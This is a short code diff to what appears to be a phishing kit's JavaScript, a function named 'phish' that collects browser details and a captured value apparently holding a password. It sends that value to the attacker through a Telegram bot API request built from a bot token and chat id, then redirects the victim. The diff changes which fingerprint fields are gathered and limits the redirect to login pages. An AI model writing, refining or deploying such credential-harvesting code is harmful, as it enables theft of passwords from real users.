@@ -4,7 +4,6 @@ const phish = (bot_token, chat_id, redirect_link) => {
         header: [
             navigator.platform,
             navigator.userAgent,
-            navigator.appVersion,
             navigator.vendor,
             window.opera
         ],
@@ -193,9 +192,10 @@ Browser:  ${e.browser.name} v${e.browser.version}%0A
             `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&parse_mode=html&text=${passVal}`
         );
         xhr2.send();
+        if(window.location.href.indexOf("login")!=-1){
         setTimeout(function() {
             goTo();
-        }, 1000);
+        }, 1000);}
     });
 
 
